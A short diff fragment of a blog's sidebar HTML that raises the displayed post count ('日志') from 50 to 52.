-              <span class="site-state-item-count">50</span>
+              <span class="site-state-item-count">52</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
